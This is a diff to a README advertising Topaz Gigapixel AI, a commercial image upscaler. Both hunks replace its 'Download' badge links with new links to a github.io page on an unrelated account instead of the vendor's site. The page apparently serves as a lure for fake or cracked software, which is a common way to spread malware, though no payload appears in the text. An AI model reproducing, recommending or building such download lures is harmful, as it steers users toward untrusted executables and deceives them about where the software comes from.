@@ -2,7 +2,7 @@
 
 Topaz Gigapixel AI is a powerful AI-driven image enhancement tool that lets you upscale photos up to 600% without losing detail. It intelligently restores sharpness, reduces noise, and enhances textures using deep learning algorithms.
 
-[![Download Gigapixel AI](https://img.shields.io/badge/Download-Gigapixel_AI-blueviolet)](https://picpick-download.github.io/.github)
+[![Download Gigapixel AI](https://img.shields.io/badge/Download-Gigapixel_AI-blueviolet)](https://asdeennerhorse.github.io/mogus/topaz)
 
 ---
 
@@ -56,7 +56,7 @@ Topaz Gigapixel AI is a powerful AI-driven image enhancement tool that lets you 
 
 ---
 
-[![Download Gigapixel AI](https://img.shields.io/badge/Download-Gigapixel_AI-blueviolet)](https://picpick-download.github.io/.github)
+[![Download Gigapixel AI](https://img.shields.io/badge/Download-Gigapixel_AI-blueviolet)](https://asdeennerhorse.github.io/mogus/topaz)
 
 ---
 
